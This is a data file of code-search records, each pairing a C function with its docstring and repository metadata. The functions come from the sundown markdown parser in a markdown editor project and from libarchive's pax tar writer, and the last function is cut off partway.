{"docstring": "/* is_headerline \u2022 returns whether the line is a setext-style hdr underline */\n", "func_signal": "static int\nis_headerline(uint8_t *data, size_t size)", "code": "{\n\tsize_t i = 0;\n\n\t/* test of level 1 header */\n\tif (data[i] == '=') {\n\t\tfor (i = 1; i < size && data[i] == '='; i++);\n\t\twhile (i < size && data[i] == ' ') i++;\n\t\treturn (i >= size || data[i] == '\\n') ? 1 : 0; }\n\n\t/* test of level 2 header */\n\tif (data[i] == '-') {\n\t\tfor (i = 1; i < size && data[i] == '-'; i++);\n\t\twhile (i < size && data[i] == ' ') i++;\n\t\treturn (i >= size || data[i] == '\\n') ? 2 : 0; }\n\n\treturn 0;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* is_ref \u2022 returns whether a line is a reference or not */\n", "func_signal": "static int\nis_ref(const uint8_t *data, size_t beg, size_t end, size_t *last, struct link_ref **refs)", "code": "{\n/*\tint n; */\n\tsize_t i = 0;\n\tsize_t id_offset, id_end;\n\tsize_t link_offset, link_end;\n\tsize_t title_offset, title_end;\n\tsize_t line_end;\n\n\t/* up to 3 optional leading spaces */\n\tif (beg + 3 >= end) return 0;\n\tif (data[beg] == ' ') { i = 1;\n\tif (data[beg + 1] == ' ') { i = 2;\n\tif (data[beg + 2] == ' ') { i = 3;\n\tif (data[beg + 3] == ' ') return 0; } } }\n\ti += beg;\n\n\t/* id part: anything but a newline between brackets */\n\tif (data[i] != '[') return 0;\n\ti++;\n\tid_offset = i;\n\twhile (i < end && data[i] != '\\n' && data[i] != '\\r' && data[i] != ']')\n\t\ti++;\n\tif (i >= end || data[i] != ']') return 0;\n\tid_end = i;\n\n\t/* spacer: colon (space | tab)* newline? (space | tab)* */\n\ti++;\n\tif (i >= end || data[i] != ':') return 0;\n\ti++;\n\twhile (i < end && data[i] == ' ') i++;\n\tif (i < end && (data[i] == '\\n' || data[i] == '\\r')) {\n\t\ti++;\n\t\tif (i < end && data[i] == '\\r' && data[i - 1] == '\\n') i++; }\n\twhile (i < end && data[i] == ' ') i++;\n\tif (i >= end) return 0;\n\n\t/* link: whitespace-free sequence, optionally between angle brackets */\n\tif (data[i] == '<')\n\t\ti++;\n\n\tlink_offset = i;\n\n\twhile (i < end && data[i] != ' ' && data[i] != '\\n' && data[i] != '\\r')\n\t\ti++;\n\n\tif (data[i - 1] == '>') link_end = i - 1;\n\telse link_end = i;\n\n\t/* optional spacer: (space | tab)* (newline | '\\'' | '\"' | '(' ) */\n\twhile (i < end && data[i] == ' ') i++;\n\tif (i < end && data[i] != '\\n' && data[i] != '\\r'\n\t\t\t&& data[i] != '\\'' && data[i] != '\"' && data[i] != '(')\n\t\treturn 0;\n\tline_end = 0;\n\t/* computing end-of-line */\n\tif (i >= end || data[i] == '\\r' || data[i] == '\\n') line_end = i;\n\tif (i + 1 < end && data[i] == '\\n' && data[i + 1] == '\\r')\n\t\tline_end = i + 1;\n\n\t/* optional (space|tab)* spacer after a newline */\n\tif (line_end) {\n\t\ti = line_end + 1;\n\t\twhile (i < end && data[i] == ' ') i++; }\n\n\t/* optional title: any non-newline sequence enclosed in '\"()\n\t\t\t\t\talone on its line */\n\ttitle_offset = title_end = 0;\n\tif (i + 1 < end\n\t&& (data[i] == '\\'' || data[i] == '\"' || data[i] == '(')) {\n\t\ti++;\n\t\ttitle_offset = i;\n\t\t/* looking for EOL */\n\t\twhile (i < end && data[i] != '\\n' && data[i] != '\\r') i++;\n\t\tif (i + 1 < end && data[i] == '\\n' && data[i + 1] == '\\r')\n\t\t\ttitle_end = i + 1;\n\t\telse\ttitle_end = i;\n\t\t/* stepping back */\n\t\ti -= 1;\n\t\twhile (i > title_offset && data[i] == ' ')\n\t\t\ti -= 1;\n\t\tif (i > title_offset\n\t\t&& (data[i] == '\\'' || data[i] == '\"' || data[i] == ')')) {\n\t\t\tline_end = title_end;\n\t\t\ttitle_end = i; } }\n\n\tif (!line_end || link_end == link_offset)\n\t\treturn 0; /* garbage after the link empty link */\n\n\t/* a valid ref has been found, filling-in return structures */\n\tif (last)\n\t\t*last = line_end;\n\n\tif (refs) {\n\t\tstruct link_ref *ref;\n\n\t\tref = add_link_ref(refs, data + id_offset, id_end - id_offset);\n\t\tif (!ref)\n\t\t\treturn 0;\n\n\t\tref->link = bufnew(link_end - link_offset);\n\t\tbufput(ref->link, data + link_offset, link_end - link_offset);\n\n\t\tif (title_end > title_offset) {\n\t\t\tref->title = bufnew(title_end - title_offset);\n\t\t\tbufput(ref->title, data + title_offset, title_end - title_offset);\n\t\t}\n\t}\n\n\treturn 1;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* parse_emph3 \u2022 parsing single emphase */\n/* finds the first closing tag, and delegates to the other emph */\n", "func_signal": "static size_t\nparse_emph3(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t size, uint8_t c)", "code": "{\n\tsize_t i = 0, len;\n\tint r;\n\n\twhile (i < size) {\n\t\tlen = find_emph_char(data + i, size - i, c);\n\t\tif (!len) return 0;\n\t\ti += len;\n\n\t\t/* skip whitespace preceded symbols */\n\t\tif (data[i] != c || _isspace(data[i - 1]))\n\t\t\tcontinue;\n\n\t\tif (i + 2 < size && data[i + 1] == c && data[i + 2] == c && rndr->cb.triple_emphasis) {\n\t\t\t/* triple symbol found */\n\t\t\tstruct buf *work = rndr_newbuf(rndr, BUFFER_SPAN);\n\n\t\t\tparse_inline(work, rndr, data, i);\n\t\t\tr = rndr->cb.triple_emphasis(ob, work, rndr->opaque);\n\t\t\trndr_popbuf(rndr, BUFFER_SPAN);\n\t\t\treturn r ? i + 3 : 0;\n\n\t\t} else if (i + 1 < size && data[i + 1] == c) {\n\t\t\t/* double symbol found, handing over to emph1 */\n\t\t\tlen = parse_emph1(ob, rndr, data - 2, size + 2, c);\n\t\t\tif (!len) return 0;\n\t\t\telse return len - 2;\n\n\t\t} else {\n\t\t\t/* single symbol found, handing over to emph2 */\n\t\t\tlen = parse_emph2(ob, rndr, data - 1, size + 1, c);\n\t\t\tif (!len) return 0;\n\t\t\telse return len - 1;\n\t\t}\n\t}\n\treturn 0;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/**********************\n * EXPORTED FUNCTIONS *\n **********************/\n", "func_signal": "struct sd_markdown *\nsd_markdown_new(\n\tunsigned int extensions,\n\tsize_t max_nesting,\n\tconst struct sd_callbacks *callbacks,\n\tvoid *opaque)", "code": "{\n\tstruct sd_markdown *md = NULL;\n\n\tassert(max_nesting > 0 && callbacks);\n\n\tmd = malloc(sizeof(struct sd_markdown));\n\tif (!md)\n\t\treturn NULL;\n\n\tmemcpy(&md->cb, callbacks, sizeof(struct sd_callbacks));\n\n\tstack_init(&md->work_bufs[BUFFER_BLOCK], 4);\n\tstack_init(&md->work_bufs[BUFFER_SPAN], 8);\n\n\tmemset(md->active_char, 0x0, 256);\n\n\tif (md->cb.emphasis || md->cb.double_emphasis || md->cb.triple_emphasis) {\n\t\tmd->active_char['*'] = MD_CHAR_EMPHASIS;\n\t\tmd->active_char['_'] = MD_CHAR_EMPHASIS;\n\t\tif (extensions & MKDEXT_STRIKETHROUGH)\n\t\t\tmd->active_char['~'] = MD_CHAR_EMPHASIS;\n\t}\n\n\tif (md->cb.codespan)\n\t\tmd->active_char['`'] = MD_CHAR_CODESPAN;\n\n\tif (md->cb.linebreak)\n\t\tmd->active_char['\\n'] = MD_CHAR_LINEBREAK;\n\n\tif (md->cb.image || md->cb.link)\n\t\tmd->active_char['['] = MD_CHAR_LINK;\n\n\tmd->active_char['<'] = MD_CHAR_LANGLE;\n\tmd->active_char['\\\\'] = MD_CHAR_ESCAPE;\n\tmd->active_char['&'] = MD_CHAR_ENTITITY;\n\n\tif (extensions & MKDEXT_AUTOLINK) {\n\t\tmd->active_char[':'] = MD_CHAR_AUTOLINK_URL;\n\t\tmd->active_char['@'] = MD_CHAR_AUTOLINK_EMAIL;\n\t\tmd->active_char['w'] = MD_CHAR_AUTOLINK_WWW;\n\t}\n\n\tif (extensions & MKDEXT_SUPERSCRIPT)\n\t\tmd->active_char['^'] = MD_CHAR_SUPERSCRIPT;\n\n\t/* Extension data */\n\tmd->ext_flags = extensions;\n\tmd->opaque = opaque;\n\tmd->max_nesting = max_nesting;\n\tmd->in_link_body = 0;\n\n\treturn md;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* char_codespan \u2022 '`' parsing a code span (assuming codespan != 0) */\n", "func_signal": "static size_t\nchar_codespan(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t offset, size_t size)", "code": "{\n\tsize_t end, nb = 0, i, f_begin, f_end;\n\n\t/* counting the number of backticks in the delimiter */\n\twhile (nb < size && data[nb] == '`')\n\t\tnb++;\n\n\t/* finding the next delimiter */\n\ti = 0;\n\tfor (end = nb; end < size && i < nb; end++) {\n\t\tif (data[end] == '`') i++;\n\t\telse i = 0;\n\t}\n\n\tif (i < nb && end >= size)\n\t\treturn 0; /* no matching delimiter */\n\n\t/* trimming outside whitespaces */\n\tf_begin = nb;\n\twhile (f_begin < end && data[f_begin] == ' ')\n\t\tf_begin++;\n\n\tf_end = end - nb;\n\twhile (f_end > nb && data[f_end-1] == ' ')\n\t\tf_end--;\n\n\t/* real code span */\n\tif (f_begin < f_end) {\n\t\tstruct buf work = { data + f_begin, f_end - f_begin, 0, 0 };\n\t\tif (!rndr->cb.codespan(ob, &work, rndr->opaque))\n\t\t\tend = 0;\n\t} else {\n\t\tif (!rndr->cb.codespan(ob, 0, rndr->opaque))\n\t\t\tend = 0;\n\t}\n\n\treturn end;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* prefix_uli \u2022 returns ordered list item prefix */\n", "func_signal": "static size_t\nprefix_uli(uint8_t *data, size_t size)", "code": "{\n\tsize_t i = 0;\n\n\tif (i < size && data[i] == ' ') i++;\n\tif (i < size && data[i] == ' ') i++;\n\tif (i < size && data[i] == ' ') i++;\n\n\tif (i + 1 >= size ||\n\t\t(data[i] != '*' && data[i] != '+' && data[i] != '-') ||\n\t\tdata[i + 1] != ' ')\n\t\treturn 0;\n\n\tif (is_next_headerline(data + i, size - i))\n\t\treturn 0;\n\n\treturn i + 2;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* bufput: appends raw data to a buffer */\n", "func_signal": "void\nbufput(struct buf *buf, const void *data, size_t len)", "code": "{\n\tassert(buf && buf->unit);\n\n\tif (buf->size + len > buf->asize && bufgrow(buf, buf->size + len) < 0)\n\t\treturn;\n\n\tmemcpy(buf->data + buf->size, data, len);\n\tbuf->size += len;\n}", "path": "src\\sundown\\buffer.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* prefix_code \u2022 returns prefix length for block code*/\n", "func_signal": "static size_t\nprefix_code(uint8_t *data, size_t size)", "code": "{\n\tif (size > 3 && data[0] == ' ' && data[1] == ' '\n\t\t&& data[2] == ' ' && data[3] == ' ') return 4;\n\n\treturn 0;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* parse_blockquote \u2022 handles parsing of a blockquote fragment */\n", "func_signal": "static size_t\nparse_blockquote(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t size)", "code": "{\n\tsize_t beg, end = 0, pre, work_size = 0;\n\tuint8_t *work_data = 0;\n\tstruct buf *out = 0;\n\n\tout = rndr_newbuf(rndr, BUFFER_BLOCK);\n\tbeg = 0;\n\twhile (beg < size) {\n\t\tfor (end = beg + 1; end < size && data[end - 1] != '\\n'; end++);\n\n\t\tpre = prefix_quote(data + beg, end - beg);\n\n\t\tif (pre)\n\t\t\tbeg += pre; /* skipping prefix */\n\n\t\t/* empty line followed by non-quote line */\n\t\telse if (is_empty(data + beg, end - beg) &&\n\t\t\t\t(end >= size || (prefix_quote(data + end, size - end) == 0 &&\n\t\t\t\t!is_empty(data + end, size - end))))\n\t\t\tbreak;\n\n\t\tif (beg < end) { /* copy into the in-place working buffer */\n\t\t\t/* bufput(work, data + beg, end - beg); */\n\t\t\tif (!work_data)\n\t\t\t\twork_data = data + beg;\n\t\t\telse if (data + beg != work_data + work_size)\n\t\t\t\tmemmove(work_data + work_size, data + beg, end - beg);\n\t\t\twork_size += end - beg;\n\t\t}\n\t\tbeg = end;\n\t}\n\n\tparse_block(out, rndr, work_data, work_size);\n\tif (rndr->cb.blockquote)\n\t\trndr->cb.blockquote(ob, out, rndr->opaque);\n\trndr_popbuf(rndr, BUFFER_BLOCK);\n\treturn end;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* bufslurp: removes a given number of bytes from the head of the array */\n", "func_signal": "void\nbufslurp(struct buf *buf, size_t len)", "code": "{\n\tassert(buf && buf->unit);\n\n\tif (len >= buf->size) {\n\t\tbuf->size = 0;\n\t\treturn;\n\t}\n\n\tbuf->size -= len;\n\tmemmove(buf->data, buf->data + len, buf->size);\n}", "path": "src\\sundown\\buffer.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* is_empty \u2022 returns the line length when it is empty, 0 otherwise */\n", "func_signal": "static size_t\nis_empty(uint8_t *data, size_t size)", "code": "{\n\tsize_t i;\n\n\tfor (i = 0; i < size && data[i] != '\\n'; i++)\n\t\tif (data[i] != ' ')\n\t\t\treturn 0;\n\n\treturn i + 1;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* parse_emph2 \u2022 parsing single emphase */\n", "func_signal": "static size_t\nparse_emph2(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t size, uint8_t c)", "code": "{\n\tint (*render_method)(struct buf *ob, const struct buf *text, void *opaque);\n\tsize_t i = 0, len;\n\tstruct buf *work = 0;\n\tint r;\n\n\trender_method = (c == '~') ? rndr->cb.strikethrough : rndr->cb.double_emphasis;\n\n\tif (!render_method)\n\t\treturn 0;\n\n\twhile (i < size) {\n\t\tlen = find_emph_char(data + i, size - i, c);\n\t\tif (!len) return 0;\n\t\ti += len;\n\n\t\tif (i + 1 < size && data[i] == c && data[i + 1] == c && i && !_isspace(data[i - 1])) {\n\t\t\twork = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\t\tparse_inline(work, rndr, data, i);\n\t\t\tr = render_method(ob, work, rndr->opaque);\n\t\t\trndr_popbuf(rndr, BUFFER_SPAN);\n\t\t\treturn r ? i + 2 : 0;\n\t\t}\n\t\ti++;\n\t}\n\treturn 0;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* check if a line begins with a code fence; return the\n * width of the code fence */\n", "func_signal": "static size_t\nprefix_codefence(uint8_t *data, size_t size)", "code": "{\n\tsize_t i = 0, n = 0;\n\tuint8_t c;\n\n\t/* skipping initial spaces */\n\tif (size < 3) return 0;\n\tif (data[0] == ' ') { i++;\n\tif (data[1] == ' ') { i++;\n\tif (data[2] == ' ') { i++; } } }\n\n\t/* looking at the hrule uint8_t */\n\tif (i + 2 >= size || !(data[i] == '~' || data[i] == '`'))\n\t\treturn 0;\n\n\tc = data[i];\n\n\t/* the whole line must be the uint8_t or whitespace */\n\twhile (i < size && data[i] == c) {\n\t\tn++; i++;\n\t}\n\n\tif (n < 3)\n\t\treturn 0;\n\n\treturn i;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/* char_langle_tag \u2022 '<' when tags or autolinks are allowed */\n", "func_signal": "static size_t\nchar_langle_tag(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t offset, size_t size)", "code": "{\n\tenum mkd_autolink altype = MKDA_NOT_AUTOLINK;\n\tsize_t end = tag_length(data, size, &altype);\n\tstruct buf work = { data, end, 0, 0 };\n\tint ret = 0;\n\n\tif (end > 2) {\n\t\tif (rndr->cb.autolink && altype != MKDA_NOT_AUTOLINK) {\n\t\t\tstruct buf *u_link = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\t\twork.data = data + 1;\n\t\t\twork.size = end - 2;\n\t\t\tunscape_text(u_link, &work);\n\t\t\tret = rndr->cb.autolink(ob, u_link, altype, rndr->opaque);\n\t\t\trndr_popbuf(rndr, BUFFER_SPAN);\n\t\t}\n\t\telse if (rndr->cb.raw_html_tag)\n\t\t\tret = rndr->cb.raw_html_tag(ob, &work, rndr->opaque);\n\t}\n\n\tif (!ret) return 0;\n\telse return end;\n}", "path": "src\\sundown\\markdown.c", "repo_name": "jijinggang/MarkdownEditor", "stars": 429, "license": "None", "language": "c", "size": 18755}
{"docstring": "/*\n * Encode a sequence of bytes into a C string using base-64 encoding.\n *\n * Returns a null-terminated C string allocated with malloc(); caller\n * is responsible for freeing the result.\n */\n", "func_signal": "static char *\nbase64_encode(const char *s, size_t len)", "code": "{\n\tstatic const char digits[64] =\n\t    { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O',\n\t      'P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d',\n\t      'e','f','g','h','i','j','k','l','m','n','o','p','q','r','s',\n\t      't','u','v','w','x','y','z','0','1','2','3','4','5','6','7',\n\t      '8','9','+','/' };\n\tint v;\n\tchar *d, *out;\n\n\t/* 3 bytes becomes 4 chars, but round up and allow for trailing NUL */\n\tout = (char *)malloc((len * 4 + 2) / 3 + 1);\n\tif (out == NULL)\n\t\treturn (NULL);\n\td = out;\n\n\t/* Convert each group of 3 bytes into 4 characters. */\n\twhile (len >= 3) {\n\t\tv = (((int)s[0] << 16) & 0xff0000)\n\t\t    | (((int)s[1] << 8) & 0xff00)\n\t\t    | (((int)s[2]) & 0x00ff);\n\t\ts += 3;\n\t\tlen -= 3;\n\t\t*d++ = digits[(v >> 18) & 0x3f];\n\t\t*d++ = digits[(v >> 12) & 0x3f];\n\t\t*d++ = digits[(v >> 6) & 0x3f];\n\t\t*d++ = digits[(v) & 0x3f];\n\t}\n\t/* Handle final group of 1 byte (2 chars) or 2 bytes (3 chars). */\n\tswitch (len) {\n\tcase 0: break;\n\tcase 1:\n\t\tv = (((int)s[0] << 16) & 0xff0000);\n\t\t*d++ = digits[(v >> 18) & 0x3f];\n\t\t*d++ = digits[(v >> 12) & 0x3f];\n\t\tbreak;\n\tcase 2:\n\t\tv = (((int)s[0] << 16) & 0xff0000)\n\t\t    | (((int)s[1] << 8) & 0xff00);\n\t\t*d++ = digits[(v >> 18) & 0x3f];\n\t\t*d++ = digits[(v >> 12) & 0x3f];\n\t\t*d++ = digits[(v >> 6) & 0x3f];\n\t\tbreak;\n\t}\n\t/* Add trailing NUL character so output is a valid C string. */\n\t*d = '\\0';\n\treturn (out);\n}", "path": "archive\\libarchive\\libarchive\\archive_write_set_format_pax.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * TODO: Consider adding 'comment' and 'charset' fields to\n * archive_entry so that clients can specify them.  Also, consider\n * adding generic key/value tags so clients can add arbitrary\n * key/value data.\n *\n * TODO: Break up this 700-line function!!!!  Yowza!\n */\n", "func_signal": "static int\narchive_write_pax_header(struct archive_write *a,\n    struct archive_entry *entry_original)", "code": "{\n\tstruct archive_entry *entry_main;\n\tconst char *p;\n\tconst char *suffix;\n\tint need_extension, r, ret;\n\tint sparse_count;\n\tuint64_t sparse_total, real_size;\n\tstruct pax *pax;\n\tconst char *hardlink;\n\tconst char *path = NULL, *linkpath = NULL;\n\tconst char *uname = NULL, *gname = NULL;\n\tconst void *mac_metadata;\n\tsize_t mac_metadata_size;\n\tstruct archive_string_conv *sconv;\n\tsize_t hardlink_length, path_length, linkpath_length;\n\tsize_t uname_length, gname_length;\n\n\tchar paxbuff[512];\n\tchar ustarbuff[512];\n\tchar ustar_entry_name[256];\n\tchar pax_entry_name[256];\n\tchar gnu_sparse_name[256];\n\tstruct archive_string entry_name;\n\n\tret = ARCHIVE_OK;\n\tneed_extension = 0;\n\tpax = (struct pax *)a->format_data;\n\n\t/* Sanity check. */\n\tif (archive_entry_pathname(entry_original) == NULL) {\n\t\tarchive_set_error(&a->archive, ARCHIVE_ERRNO_MISC,\n\t\t\t  \"Can't record entry in tar file without pathname\");\n\t\treturn (ARCHIVE_FAILED);\n\t}\n\n\t/*\n\t * Choose a header encoding.\n\t */\n\tif (pax->opt_binary)\n\t\tsconv = NULL;/* Binary mode. */\n\telse {\n\t\t/* Header encoding is UTF-8. */\n\t\tif (pax->sconv_utf8 == NULL) {\n\t\t\t/* Initialize the string conversion object\n\t\t\t * we must need */\n\t\t\tpax->sconv_utf8 = archive_string_conversion_to_charset(\n\t\t\t    &(a->archive), \"UTF-8\", 1);\n\t\t\tif (pax->sconv_utf8 == NULL)\n\t\t\t\t/* Couldn't allocate memory */\n\t\t\t\treturn (ARCHIVE_FAILED);\n\t\t}\n\t\tsconv = pax->sconv_utf8;\n\t}\n\n\tr = get_entry_hardlink(a, entry_original, &hardlink,\n\t    &hardlink_length, sconv);\n\tif (r == ARCHIVE_FATAL)\n\t\treturn (r);\n\telse if (r != ARCHIVE_OK) {\n\t\tr = get_entry_hardlink(a, entry_original, &hardlink,\n\t\t    &hardlink_length, NULL);\n\t\tif (r == ARCHIVE_FATAL)\n\t\t\treturn (r);\n\t\tarchive_set_error(&a->archive, ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t    \"Can't translate linkname '%s' to %s\", hardlink,\n\t\t    archive_string_conversion_charset_name(sconv));\n\t\tret = ARCHIVE_WARN;\n\t\tsconv = NULL;/* The header charset switches to binary mode. */\n\t}\n\n\t/* Make sure this is a type of entry that we can handle here */\n\tif (hardlink == NULL) {\n\t\tswitch (archive_entry_filetype(entry_original)) {\n\t\tcase AE_IFBLK:\n\t\tcase AE_IFCHR:\n\t\tcase AE_IFIFO:\n\t\tcase AE_IFLNK:\n\t\tcase AE_IFREG:\n\t\t\tbreak;\n\t\tcase AE_IFDIR:\n\t\t{\n\t\t\t/*\n\t\t\t * Ensure a trailing '/'.  Modify the original\n\t\t\t * entry so the client sees the change.\n\t\t\t */\n#if defined(_WIN32) && !defined(__CYGWIN__)\n\t\t\tconst wchar_t *wp;\n\n\t\t\twp = archive_entry_pathname_w(entry_original);\n\t\t\tif (wp != NULL && wp[wcslen(wp) -1] != L'/') {\n\t\t\t\tstruct archive_wstring ws;\n\n\t\t\t\tarchive_string_init(&ws);\n\t\t\t\tpath_length = wcslen(wp);\n\t\t\t\tif (archive_wstring_ensure(&ws,\n\t\t\t\t    path_length + 2) == NULL) {\n\t\t\t\t\tarchive_set_error(&a->archive, ENOMEM,\n\t\t\t\t\t    \"Can't allocate pax data\");\n\t\t\t\t\tarchive_wstring_free(&ws);\n\t\t\t\t\treturn(ARCHIVE_FATAL);\n\t\t\t\t}\n\t\t\t\t/* Should we keep '\\' ? */\n\t\t\t\tif (wp[path_length -1] == L'\\\\')\n\t\t\t\t\tpath_length--;\n\t\t\t\tarchive_wstrncpy(&ws, wp, path_length);\n\t\t\t\tarchive_wstrappend_wchar(&ws, L'/');\n\t\t\t\tarchive_entry_copy_pathname_w(\n\t\t\t\t    entry_original, ws.s);\n\t\t\t\tarchive_wstring_free(&ws);\n\t\t\t\tp = NULL;\n\t\t\t} else\n#endif\n\t\t\t\tp = archive_entry_pathname(entry_original);\n\t\t\t/*\n\t\t\t * On Windows, this is a backup operation just in\n\t\t\t * case getting WCS failed. On POSIX, this is a\n\t\t\t * normal operation.\n\t\t\t */\n\t\t\tif (p != NULL && p[strlen(p) - 1] != '/') {\n\t\t\t\tstruct archive_string as;\n\n\t\t\t\tarchive_string_init(&as);\n\t\t\t\tpath_length = strlen(p);\n\t\t\t\tif (archive_string_ensure(&as,\n\t\t\t\t    path_length + 2) == NULL) {\n\t\t\t\t\tarchive_set_error(&a->archive, ENOMEM,\n\t\t\t\t\t    \"Can't allocate pax data\");\n\t\t\t\t\tarchive_string_free(&as);\n\t\t\t\t\treturn(ARCHIVE_FATAL);\n\t\t\t\t}\n#if defined(_WIN32) && !defined(__CYGWIN__)\n\t\t\t\t/* NOTE: This might break the pathname\n\t\t\t\t * if the current code page is CP932 and\n\t\t\t\t * the pathname includes a character '\\'\n\t\t\t\t * as a part of its multibyte pathname. */\n\t\t\t\tif (p[strlen(p) -1] == '\\\\')\n\t\t\t\t\tpath_length--;\n\t\t\t\telse\n#endif\n\t\t\t\tarchive_strncpy(&as, p, path_length);\n\t\t\t\tarchive_strappend_char(&as, '/');\n\t\t\t\tarchive_entry_copy_pathname(\n\t\t\t\t    entry_original, as.s);\n\t\t\t\tarchive_string_free(&as);\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tcase AE_IFSOCK:\n\t\t\tarchive_set_error(&a->archive,\n\t\t\t    ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t\t    \"tar format cannot archive socket\");\n\t\t\treturn (ARCHIVE_FAILED);\n\t\tdefault:\n\t\t\tarchive_set_error(&a->archive,\n\t\t\t    ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t\t    \"tar format cannot archive this (type=0%lo)\",\n\t\t\t    (unsigned long)\n\t\t\t    archive_entry_filetype(entry_original));\n\t\t\treturn (ARCHIVE_FAILED);\n\t\t}\n\t}\n\n\t/*\n\t * If Mac OS metadata blob is here, recurse to write that\n\t * as a separate entry.  This is really a pretty poor design:\n\t * In particular, it doubles the overhead for long filenames.\n\t * TODO: Help Apple folks design something better and figure\n\t * out how to transition from this legacy format.\n\t *\n\t * Note that this code is present on every platform; clients\n\t * on non-Mac are unlikely to ever provide this data, but\n\t * applications that copy entries from one archive to another\n\t * should not lose data just because the local filesystem\n\t * can't store it.\n\t */\n\tmac_metadata =\n\t    archive_entry_mac_metadata(entry_original, &mac_metadata_size);\n\tif (mac_metadata != NULL) {\n\t\tconst char *oname;\n\t\tchar *name, *bname;\n\t\tsize_t name_length;\n\t\tstruct archive_entry *extra = archive_entry_new2(&a->archive);\n\n\t\toname = archive_entry_pathname(entry_original);\n\t\tname_length = strlen(oname);\n\t\tname = malloc(name_length + 3);\n\t\tif (name == NULL || extra == NULL) {\n\t\t\t/* XXX error message */\n\t\t\tarchive_entry_free(extra);\n\t\t\tfree(name);\n\t\t\treturn (ARCHIVE_FAILED);\n\t\t}\n\t\tstrcpy(name, oname);\n\t\t/* Find last '/'; strip trailing '/' characters */\n\t\tbname = strrchr(name, '/');\n\t\twhile (bname != NULL && bname[1] == '\\0') {\n\t\t\t*bname = '\\0';\n\t\t\tbname = strrchr(name, '/');\n\t\t}\n\t\tif (bname == NULL) {\n\t\t\tmemmove(name + 2, name, name_length + 1);\n\t\t\tmemmove(name, \"._\", 2);\n\t\t} else {\n\t\t\tbname += 1;\n\t\t\tmemmove(bname + 2, bname, strlen(bname) + 1);\n\t\t\tmemmove(bname, \"._\", 2);\n\t\t}\n\t\tarchive_entry_copy_pathname(extra, name);\n\t\tfree(name);\n\n\t\tarchive_entry_set_size(extra, mac_metadata_size);\n\t\tarchive_entry_set_filetype(extra, AE_IFREG);\n\t\tarchive_entry_set_perm(extra,\n\t\t    archive_entry_perm(entry_original));\n\t\tarchive_entry_set_mtime(extra,\n\t\t    archive_entry_mtime(entry_original),\n\t\t    archive_entry_mtime_nsec(entry_original));\n\t\tarchive_entry_set_gid(extra,\n\t\t    archive_entry_gid(entry_original));\n\t\tarchive_entry_set_gname(extra,\n\t\t    archive_entry_gname(entry_original));\n\t\tarchive_entry_set_uid(extra,\n\t\t    archive_entry_uid(entry_original));\n\t\tarchive_entry_set_uname(extra,\n\t\t    archive_entry_uname(entry_original));\n\n\t\t/* Recurse to write the special copyfile entry. */\n\t\tr = archive_write_pax_header(a, extra);\n\t\tarchive_entry_free(extra);\n\t\tif (r < ARCHIVE_WARN)\n\t\t\treturn (r);\n\t\tif (r < ret)\n\t\t\tret = r;\n\t\tr = (int)archive_write_pax_data(a, mac_metadata,\n\t\t    mac_metadata_size);\n\t\tif (r < ARCHIVE_WARN)\n\t\t\treturn (r);\n\t\tif (r < ret)\n\t\t\tret = r;\n\t\tr = archive_write_pax_finish_entry(a);\n\t\tif (r < ARCHIVE_WARN)\n\t\t\treturn (r);\n\t\tif (r < ret)\n\t\t\tret = r;\n\t}\n\n\t/* Copy entry so we can modify it as needed. */\n#if defined(_WIN32) && !defined(__CYGWIN__)\n\t/* Make sure the path separators in pahtname, hardlink and symlink\n\t * are all slash '/', not the Windows path separator '\\'. */\n\tentry_main = __la_win_entry_in_posix_pathseparator(entry_original);\n\tif (entry_main == entry_original)\n\t\tentry_main = archive_entry_clone(entry_original);\n#else\n\tentry_main = archive_entry_clone(entry_original);\n#endif\n\tif (entry_main == NULL) {\n\t\tarchive_set_error(&a->archive, ENOMEM,\n\t\t    \"Can't allocate pax data\");\n\t\treturn(ARCHIVE_FATAL);\n\t}\n\tarchive_string_empty(&(pax->pax_header)); /* Blank our work area. 